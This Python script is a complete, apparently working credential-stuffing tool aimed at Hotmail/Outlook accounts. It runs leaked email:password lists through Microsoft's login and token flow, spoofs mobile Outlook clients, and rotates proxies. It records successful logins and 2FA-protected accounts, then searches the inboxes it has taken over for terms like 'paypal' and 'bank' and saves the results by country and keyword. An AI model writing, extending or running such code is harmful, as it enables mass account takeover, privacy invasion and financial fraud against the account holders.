#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FULL CUSTOM INBOX ENGINE - Complete hotmail checker
- Hotmail/Outlook account validator with full login flow
- Keyword search in inbox (supports email addresses and plain words)
- Country detection from profile
- 2FA detection
- Proxy support (HTTP/HTTPS, with/without auth)
- Professional result management (organised by keyword, country, etc.)
- Multi-threaded scanning
"""

import re
import time
import uuid
import random
import requests
import logging
import zipfile
from threading import Lock
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Optional, Any

# Suppress SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


# ========================================================================
# RESULT MANAGER - Saves findings to organised files
# ========================================================================
class ResultManager:
    def __init__(self, base_path: str = "results", keywords: Optional[List[str]] = None):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.base_folder = Path(base_path) / f"inbox_scan_{timestamp}"
        self.hits_file = self.base_folder / "hits.txt"
        self.two_fa_file = self.base_folder / "2fa.txt"
        self.bad_file = self.base_folder / "bad.txt"
        self.keywords_folder = self.base_folder / "keywords"
        self.countries_folder = self.base_folder / "countries"
        self.keywords = keywords if keywords else []

        # Create directories
        self.base_folder.mkdir(parents=True, exist_ok=True)
        self.keywords_folder.mkdir(exist_ok=True)
        self.countries_folder.mkdir(exist_ok=True)

        self.lock = Lock()
        self.keyword_files = {}
        self.country_files = {}

    def save_hit(self, email: str, password: str, result: Dict) -> None:
        """Save a successful login - NEW FORMAT: email:pass [country] [keyword1:count1, keyword2:count2]"""
        country = result.get("country", "Unknown")
        keywords_data = result.get("keywords", {})
        
        # Build keyword counts string
        if keywords_data:
            keyword_counts = []
            for kw, info in keywords_data.items():
                count = info.get('count', 0)
                keyword_counts.append(f"{kw}:{count}")
            keyword_str = f"[{', '.join(keyword_counts)}]"
        else:
            keyword_str = "[]"
        
        # NEW FORMAT: email:pass [country] [keyword1:count1, keyword2:count2]
        hit_line = f"{email}:{password} [{country}] {keyword_str}\n"

        with self.lock:
            # Main hits file
            with open(self.hits_file, 'a', encoding='utf-8') as f:
                f.write(hit_line)

            # Keyword-specific files - simplified format without counts
            for kw in keywords_data.keys():
                kw_file = self.keywords_folder / f"{kw}.txt"
                with open(kw_file, 'a', encoding='utf-8') as f:
                    f.write(f"{email}:{password} [{country}]\n")
                self.keyword_files[kw] = kw_file

            # Country-specific files - simplified format
            if country and country != "Unknown":
                country_file = self.countries_folder / f"{country}.txt"
                with open(country_file, 'a', encoding='utf-8') as f:
                    f.write(f"{email}:{password} {keyword_str}\n")
                self.country_files[country] = country_file

    def save_2fa(self, email: str, password: str) -> None:
        with self.lock:
            with open(self.two_fa_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}\n")

    def save_bad(self, email: str) -> None:
        with self.lock:
            with open(self.bad_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}\n")

    def get_stats(self) -> Dict:
        return {
            'hits': self._count_lines(self.hits_file),
            '2fa': self._count_lines(self.two_fa_file),
            'bad': self._count_lines(self.bad_file)
        }

    @staticmethod
    def _count_lines(filepath: Path) -> int:
        if not filepath.exists():
            return 0
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                return len(f.readlines())
        except:
            return 0

    def create_zip(self) -> Optional[str]:
        """Create a ZIP archive of all results."""
        zip_path = str(self.base_folder) + ".zip"
        try:
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                for file in self.base_folder.rglob("*"):
                    if file.is_file():
                        arcname = file.relative_to(self.base_folder.parent)
                        zf.write(file, arcname)
            logger.info(f"✅ ZIP created: {zip_path}")
            return zip_path
        except Exception as e:
            logger.error(f"ZIP creation failed: {e}")
            return None


# ========================================================================
# PROXY MANAGER
# ========================================================================
class ProxyManager:
    def __init__(self, proxy_list: Optional[List[str]] = None):
        self.proxies = []
        self.lock = Lock()
        if proxy_list:
            self.load_from_list(proxy_list)

    def load_from_list(self, proxy_list: List[str]):
        for line in proxy_list:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if ':' in line:
                parts = line.split(':')
                if len(parts) == 2:
                    # ip:port
                    proxy = {
                        'http': f'http://{parts[0]}:{parts[1]}',
                        'https': f'http://{parts[0]}:{parts[1]}'
                    }
                    self.proxies.append(proxy)
                elif len(parts) == 4:
                    # ip:port:user:pass
                    proxy = {
                        'http': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}',
                        'https': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
                    }
                    self.proxies.append(proxy)
        logger.info(f"Loaded {len(self.proxies)} proxies")

    def load_from_text(self, text: str) -> int:
        lines = [line.strip() for line in text.split('\n') if line.strip() and not line.startswith('#')]
        self.load_from_list(lines)
        return len(self.proxies)

    def get_random_proxy(self) -> Optional[Dict[str, str]]:
        with self.lock:
            if not self.proxies:
                return None
            return random.choice(self.proxies)

    def has_proxies(self) -> bool:
        return len(self.proxies) > 0


# ========================================================================
# HOTMAIL CHECKER - Full robust version (from your "crack" function)
# ========================================================================
class HotmailChecker:
    def __init__(self, keywords: Optional[List[str]] = None, proxy_manager: Optional[ProxyManager] = None):
        self.uuid = str(uuid.uuid4())
        self.keywords = keywords if keywords else []
        self.proxy_manager = proxy_manager

    def get_session(self) -> requests.Session:
        session = requests.Session()
        if self.proxy_manager and self.proxy_manager.has_proxies():
            proxy = self.proxy_manager.get_random_proxy()
            if proxy:
                session.proxies.update(proxy)
        return session

    def parse_country_from_json(self, json_data) -> str:
        try:
            if isinstance(json_data, dict):
                if "accounts" in json_data and isinstance(json_data["accounts"], list):
                    for account in json_data["accounts"]:
                        if "location" in account and account["location"]:
                            return str(account["location"]).strip()
                if "location" in json_data and json_data["location"]:
                    location = json_data["location"]
                    if isinstance(location, str):
                        parts = [p.strip() for p in location.split(',')]
                        return parts[-1] if parts else ""
                    elif isinstance(location, dict):
                        for key in ['country', 'countryOrRegion', 'countryCode']:
                            if key in location and location[key]:
                                return str(location[key])
                for key in ['country', 'countryOrRegion', 'countryCode']:
                    if key in json_data and json_data[key]:
                        return str(json_data[key])
        except:
            pass
        return ""

    def extract_inbox_count(self, text: str) -> int:
        try:
            patterns = [
                r'"DisplayName":"Inbox","TotalCount":(\d+)',
                r'"TotalCount":(\d+)',
                r'Inbox","TotalCount":(\d+)'
            ]
            for pattern in patterns:
                match = re.search(pattern, text)
                if match:
                    return int(match.group(1))
        except:
            pass
        return 0

    def get_email_provider_count(self, email: str, access_token: str, cid: str) -> int:
        try:
            domain = email.split('@')[1] if '@' in email else ""
            if not domain:
                return 0
            session = self.get_session()
            url = "https://outlook.live.com/search/api/v2/query"
            query_string = f'from:"@{domain}" OR "{domain}"'
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Query": {"QueryString": query_string},
                    "Size": 10
                }]
            }
            headers = {
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            r = session.post(url, json=payload, headers=headers, timeout=12)
            if r.status_code == 200:
                data = r.json()
                total = 0
                if 'EntitySets' in data:
                    for es in data['EntitySets']:
                        if 'ResultSets' in es:
                            for rs in es['ResultSets']:
                                total = rs.get('Total', 0)
                                break
                return total
        except:
            pass
        return 0

    def check_keywords(self, email: str, access_token: str, cid: str) -> Dict[str, Any]:
        results = {}
        if not self.keywords:
            return results
        session = self.get_session()
        for kw in self.keywords:
            try:
                url = "https://outlook.live.com/search/api/v2/query"
                # Special formatting for email addresses
                if "@" in kw and " " not in kw:
                    qstr = f'from:"{kw}" OR "{kw}"'
                else:
                    qstr = kw
                payload = {
                    "Cvid": str(uuid.uuid4()),
                    "Scenario": {"Name": "owa.react"},
                    "EntityRequests": [{
                        "EntityType": "Conversation",
                        "ContentSources": ["Exchange"],
                        "Query": {"QueryString": qstr},
                        "Size": 10
                    }]
                }
                headers = {
                    'Authorization': f'Bearer {access_token}',
                    'X-AnchorMailbox': f'CID:{cid}',
                    'Content-Type': 'application/json'
                }
                r = session.post(url, json=payload, headers=headers, timeout=12)
                if r.status_code == 200:
                    data = r.json()
                    total = 0
                    if 'EntitySets' in data:
                        for es in data['EntitySets']:
                            if 'ResultSets' in es:
                                for rs in es['ResultSets']:
                                    total = rs.get('Total', 0)
                                    break
                    if total > 0:
                        results[kw] = {'count': total}
                        logger.info(f"✅ Found {total} items for keyword: {kw}")
            except Exception as e:
                logger.debug(f"Keyword search error for {kw}: {e}")
                continue
        return results

    def check(self, email: str, password: str) -> Dict[str, Any]:
        """Full Hotmail/Outlook login check with all features."""
        session = None
        try:
            session = self.get_session()

            # Step 1: Check if account exists (MSAccount or OrgId)
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": self.uuid,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = session.get(url1, headers=headers1, timeout=15)
            txt = r1.text
            if "Neither" in txt or "Both" in txt or "Placeholder" in txt or "OrgId" in txt:
                return {"status": "BAD", "reason": "Account doesn't exist"}
            if "MSAccount" not in txt:
                return {"status": "BAD", "reason": "Not an MSAccount"}

            time.sleep(0.3)

            # Step 2: Get login page and extract PPFT & post URL
            url2 = (
                f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
                f"?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code"
                f"&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                f"&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            )
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)

            url_post_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_post_match or not ppft_match:
                return {"status": "BAD", "reason": "Login form not found"}
            post_url = url_post_match.group(1).replace("\\/", "/")
            ppft_val = ppft_match.group(1)

            # Step 3: Submit credentials
            login_data = (
                f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1"
                f"&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2"
                f"&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid="
                f"&PPFT={ppft_val}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0"
                f"&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            )
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            txt3 = r3.text.lower()

            # Check for 2FA / verification
            if "identity/confirm" in txt3 or "https://account.live.com/identity/confirm" in r3.text:
                return {"status": "2FA", "email": email, "password": password}
            if "consent" in txt3 or "https://account.live.com/Consent" in r3.text:
                return {"status": "2FA", "email": email, "password": password}

            # Bad login
            if "incorrect" in txt3 or "error" in txt3:
                return {"status": "BAD", "reason": "Wrong password"}
            if "abuse" in r3.text:
                return {"status": "BAD", "reason": "Account blocked"}

            # Step 4: Get authorisation code from redirect
            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD", "reason": "No redirect after login"}
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD", "reason": "No authorisation code"}
            code = code_match.group(1)

            mspcid = session.cookies.get("MSPCID", "")
            if not mspcid:
                return {"status": "BAD", "reason": "MSPCID cookie missing"}
            cid = mspcid.upper()

            # Step 5: Exchange code for access token
            token_data = (
                f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                f"&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                f"&grant_type=authorization_code&code={code}"
                f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            )
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                              data=token_data,
                              headers={"Content-Type": "application/x-www-form-urlencoded"},
                              timeout=15)
            if "access_token" not in r4.text:
                return {"status": "BAD", "reason": "Access token not received"}
            access_token = r4.json()["access_token"]

            # Step 6: Get profile (country)
            country = ""
            try:
                profile_headers = {
                    "User-Agent": "Outlook-Android/2.0",
                    "Authorization": f"Bearer {access_token}",
                    "X-AnchorMailbox": f"CID:{cid}"
                }
                r5 = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                                 headers=profile_headers, timeout=15)
                if r5.status_code == 200:
                    profile = r5.json()
                    country = self.parse_country_from_json(profile)
            except:
                pass

            # Step 7: Domain count (emails from same provider)
            domain_count = self.get_email_provider_count(email, access_token, cid)

            # Step 8: Inbox count
            inbox_count = 0
            try:
                startup_headers = {
                    "Host": "outlook.live.com",
                    "content-length": "0",
                    "x-owa-sessionid": str(uuid.uuid4()),
                    "x-req-source": "Mini",
                    "authorization": f"Bearer {access_token}",
                    "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36",
                    "action": "StartupData",
                    "content-type": "application/json"
                }
                r6 = session.post(
                    f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0",
                    data="", headers=startup_headers, timeout=20)
                if r6.status_code == 200:
                    inbox_count = self.extract_inbox_count(r6.text)
            except:
                pass

            # Step 9: Keyword searches
            keyword_results = self.check_keywords(email, access_token, cid)

            return {
                "status": "HIT",
                "email": email,
                "password": password,
                "country": country,
                "inbox_count": inbox_count,
                "domain_count": domain_count,
                "keywords": keyword_results
            }

        except Exception as e:
            logger.debug(f"Check error for {email}: {e}")
            return {"status": "ERROR", "error": str(e)}


# ========================================================================
# FULL CUSTOM INBOX ENGINE - Multi-threaded scanner with result management
# ========================================================================
class FullCustomInboxEngine:
    def __init__(self, keywords: Optional[List[str]] = None, proxies: Optional[List[str]] = None):
        self.keywords = keywords if keywords else []
        self.proxy_manager = ProxyManager()
        if proxies:
            self.proxy_manager.load_from_list(proxies)

        self.result_manager = ResultManager(keywords=self.keywords)
        self.checker = HotmailChecker(keywords=self.keywords, proxy_manager=self.proxy_manager)

        self.stats = {
            'total': 0,
            'checked': 0,
            'hits': 0,
            '2fa': 0,
            'bad': 0
        }
        self.stats_lock = Lock()

    def add_proxies(self, proxy_list: List[str]) -> int:
        return self.proxy_manager.load_from_text('\n'.join(proxy_list))

    def check_combo(self, email: str, password: str) -> Dict[str, Any]:
        """Check a single email:password combo and save results."""
        result = self.checker.check(email, password)

        with self.stats_lock:
            self.stats['checked'] += 1
            if result['status'] == 'HIT':
                self.stats['hits'] += 1
                self.result_manager.save_hit(email, password, result)
                
                # Format the output for console logging
                keywords = result.get("keywords", {})
                if keywords:
                    keyword_str = " ".join([f"[{kw}:{info['count']}]" for kw, info in keywords.items()])
                    logger.info(f"✅ HIT: {email}:{password} [{result.get('country', 'Unknown')}] {keyword_str}")
                else:
                    logger.info(f"✅ HIT: {email}:{password} [{result.get('country', 'Unknown')}]")
                    
            elif result['status'] == '2FA':
                self.stats['2fa'] += 1
                self.result_manager.save_2fa(email, password)
                logger.info(f"🔐 2FA: {email}:{password}")
            elif result['status'] == 'BAD':
                self.stats['bad'] += 1
                self.result_manager.save_bad(email)
            # ERROR is ignored for stats but logged

        return result

    def scan(self, combos: List[str], threads: int = 10, callback: Optional[callable] = None) -> Dict[str, Any]:
        """
        Scan a list of "email:password" lines.
        :param combos: list of strings like "user@example.com:pass123"
        :param threads: number of concurrent threads
        :param callback: optional function called after each result (receives result dict)
        :return: final statistics
        """
        self.stats['total'] = len(combos)

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for combo in combos:
                if ':' not in combo:
                    continue
                email, password = combo.split(':', 1)
                future = executor.submit(self.check_combo, email, password)
                futures.append(future)

            for future in as_completed(futures):
                try:
                    result = future.result()
                    if callback:
                        callback(result)
                except Exception as e:
                    logger.error(f"Scan error: {e}")

        return self.get_stats()

    def get_stats(self) -> Dict[str, Any]:
        with self.stats_lock:
            return dict(self.stats)

    def get_results_path(self) -> str:
        return str(self.result_manager.base_folder)

    def create_zip(self) -> Optional[str]:
        return self.result_manager.create_zip()

    def export_report(self) -> Dict[str, Any]:
        """Return full report with statistics and ZIP file path."""
        stats = self.get_stats()
        zip_path = self.create_zip()
        return {
            'stats': stats,
            'results_path': self.get_results_path(),
            'zip_path': zip_path,
            'timestamp': datetime.now().isoformat()
        }


# ========================================================================
# EXAMPLE USAGE (if run directly)
# ========================================================================
if __name__ == "__main__":
    # Example: load combos from a file, proxies from a file, keywords from list
    # and run a scan.
    import sys

    # You can replace these with actual file reads or CLI args
    combo_list = [
        "test1@outlook.com:wrongpass",
        "test2@hotmail.com:correctpass123"
    ]
    keywords = ["paypal", "invoice", "bank"]
    proxy_list = []   # or ["1.2.3.4:8080", "5.6.7.8:3128:user:pass"]

    engine = FullCustomInboxEngine(keywords=keywords, proxies=proxy_list)
    print("Starting scan...")
    stats = engine.scan(combo_list, threads=5)
    print("Scan finished. Stats:", stats)
    print("Results saved in:", engine.get_results_path())
    zip_file = engine.create_zip()
    if zip_file:
        print("ZIP archive:", zip_file)